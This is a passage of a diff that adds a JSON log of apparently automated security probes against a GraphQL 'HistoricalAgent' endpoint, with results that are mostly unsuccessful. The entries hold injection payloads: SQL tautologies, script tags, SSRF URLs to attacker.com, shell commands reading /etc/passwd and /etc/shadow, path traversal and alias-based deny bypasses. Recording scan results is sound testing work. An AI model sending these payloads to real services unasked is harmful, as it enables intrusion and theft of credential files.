+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<script>alert('xss')</script>\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.074,
+    "timestamp": "2025-09-29T07:49:51.228419Z",
+    "count": 80,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"http://attacker.com/evilhook\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T07:49:53.032895Z",
+    "count": 81,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123; cat /etc/passwd\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T07:49:55.289633Z",
+    "count": 82,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"../../../etc/passwd\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.086,
+    "timestamp": "2025-09-29T07:49:56.933464Z",
+    "count": 83,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<h1>Hello Admin</h1>\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.078,
+    "timestamp": "2025-09-29T07:49:59.682876Z",
+    "count": 84,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-non-aliased\") {\n    id\n    type\n    description {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.094,
+        "timestamp": "2025-09-29T07:50:01.718030Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.094,
+        "timestamp": "2025-09-29T07:50:01.812177Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 85,
+    "timestamp": "2025-09-29T07:50:01.812248Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.092,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery BlockedQuery {\n  s: HistoricalAgent(id: \"agent-aliased\") {\n    id\n    type\n    description {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.103,
+        "timestamp": "2025-09-29T07:50:04.834313Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.089,
+        "timestamp": "2025-09-29T07:50:04.924356Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 86,
+    "timestamp": "2025-09-29T07:50:04.924426Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.102,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.094,
+    "timestamp": "2025-09-29T07:50:06.926729Z",
+    "count": 87,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[HistoricalAgent]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/types]) : Field 'types' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-789\") {\n    id\n    typ # Typo for 'type'\n    identfier # Typo for 'identifier'\n    descriptions { # Correct field, but exploring for suggestions within it if possible\n      nam # Typo for 'name'\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T07:50:09.170961Z",
+    "count": 88,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/typ]) : Field 'typ' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/identfier]) : Field 'identfier' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/descriptions/nam]) : Field 'nam' in type 'HistoricalAgentDescription' is undefined",
+          "locations": [
+            {
+              "line": 8,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-12345\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T07:50:28.812396Z",
+    "count": 89,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-12345' OR 1=1 --\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.09,
+    "timestamp": "2025-09-29T07:50:31.901244Z",
+    "count": 90,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-12345<script>alert('document.cookie')</script>\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T07:50:34.340604Z",
+    "count": 91,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"http://localhost:8080/admin\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.103,
+    "timestamp": "2025-09-29T07:50:36.721753Z",
+    "count": 92,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-12345; cat /etc/shadow\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.106,
+    "timestamp": "2025-09-29T07:50:39.515066Z",
+    "count": 93,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"../../../etc/passwd\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T07:50:41.298951Z",
+    "count": 94,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-12345<h1>Injected Title</h1>\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.104,
+    "timestamp": "2025-09-29T07:50:43.550011Z",
+    "count": 95,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-67890\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.094,
+        "timestamp": "2025-09-29T07:50:45.645817Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.093,
+        "timestamp": "2025-09-29T07:50:45.738406Z",
+        "response_body": {
+          "data": {
+            "h": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 96,
+    "timestamp": "2025-09-29T07:50:45.738468Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.094,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery BypassedHistoricalAgent {\n  h: HistoricalAgent(id: \"agent-67890\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.1,
+        "timestamp": "2025-09-29T07:50:48.681426Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.085,
+        "timestamp": "2025-09-29T07:50:48.767252Z",
+        "response_body": {
+          "data": {
+            "h": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 97,
+    "timestamp": "2025-09-29T07:50:48.767316Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.1,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.096,
+    "timestamp": "2025-09-29T07:50:51.242849Z",
+    "count": 98,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[HistoricalAgent]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/types]) : Field 'types' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-98765\") {\n    id\n    typ # Typo for 'type'\n    identfier # Typo for 'identifier'\n    description {\n      nam # Typo for 'name'\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.098,
+    "timestamp": "2025-09-29T07:50:53.484450Z",
+    "count": 99,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/typ]) : Field 'typ' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/identfier]) : Field 'identfier' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/description/nam]) : Field 'nam' in type 'HistoricalAgentDescription' is undefined",
+          "locations": [
+            {
+              "line": 8,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T07:51:11.145657Z",
+    "count": 100,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123' OR '1'='1\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.098,
+    "timestamp": "2025-09-29T07:51:13.101038Z",
+    "count": 101,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<script>alert('xss')</script>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.109,
+    "timestamp": "2025-09-29T07:51:15.581669Z",
+    "count": 102,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"http://attacker.com/evilhook\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.093,
+    "timestamp": "2025-09-29T07:51:18.491424Z",
+    "count": 103,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123; cat /etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.083,
+    "timestamp": "2025-09-29T07:51:20.425690Z",
+    "count": 104,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"../../../etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T07:51:23.493540Z",
+    "count": 105,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<h1>Hello Admin</h1>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.11,
+    "timestamp": "2025-09-29T07:51:26.109928Z",
+    "count": 106,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-456\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.094,
+        "timestamp": "2025-09-29T07:51:29.172522Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.113,
+        "timestamp": "2025-09-29T07:51:29.285750Z",
+        "response_body": {
+          "data": {
+            "agentAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 107,
+    "timestamp": "2025-09-29T07:51:29.285819Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.082,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery BypassQuery {\n  agentAlias: HistoricalAgent(id: \"agent-456\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.087,
+        "timestamp": "2025-09-29T07:51:32.353038Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.079,
+        "timestamp": "2025-09-29T07:51:32.432804Z",
+        "response_body": {
+          "data": {
+            "agentAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 108,
+    "timestamp": "2025-09-29T07:51:32.432842Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.08,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent {\n    types {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.079,
+    "timestamp": "2025-09-29T07:51:35.029279Z",
+    "count": 109,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[HistoricalAgent]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/types]) : Field 'types' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-789\") {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.086,
+    "timestamp": "2025-09-29T07:51:37.044097Z",
+    "count": 110,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (SubselectionRequired@[HistoricalAgent/description]) : Subselection required for type 'HistoricalAgentDescription' of field 'description'",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"ehri_cb-003666\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.093,
+    "timestamp": "2025-09-29T08:38:37.163252Z",
+    "count": 111,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": {
+          "id": "ehri_cb-003666",
+          "type": "HistoricalAgent"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"ehri_cb-003666' OR '1'='1\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.099,
+    "timestamp": "2025-09-29T08:38:40.031507Z",
+    "count": 112,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"ehri_cb-003666<script>alert('xss')</script>\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T08:38:42.343039Z",
+    "count": 113,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"http://attacker.com/ssrf_callback\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.097,
+    "timestamp": "2025-09-29T08:38:44.189416Z",
+    "count": 114,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"ehri_cb-003666; cat /etc/passwd\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.086,
+    "timestamp": "2025-09-29T08:38:46.614959Z",
+    "count": 115,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"../../../etc/passwd\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.095,
+    "timestamp": "2025-09-29T08:38:49.024659Z",
+    "count": 116,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"ehri_cb-003666<h1>Injected HTML</h1>\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.102,
+    "timestamp": "2025-09-29T08:38:51.103899Z",
+    "count": 117,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery BypassQuery {\n  agentAlias: HistoricalAgent(id: \"ehri_cb-003666\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.09,
+        "timestamp": "2025-09-29T08:38:53.681297Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.092,
+        "timestamp": "2025-09-29T08:38:53.773101Z",
+        "response_body": {
+          "data": {
+            "agentAlias": {
+              "id": "ehri_cb-003666",
+              "type": "HistoricalAgent"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 118,
+    "timestamp": "2025-09-29T08:38:53.773138Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.096,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.09,
+    "timestamp": "2025-09-29T08:38:56.937617Z",
+    "count": 119,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[HistoricalAgent]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/types]) : Field 'types' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"ehri_cb-003666\") {\n    id\n    typo\n    descrip\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.092,
+    "timestamp": "2025-09-29T08:38:59.426160Z",
+    "count": 120,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/typo]) : Field 'typo' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
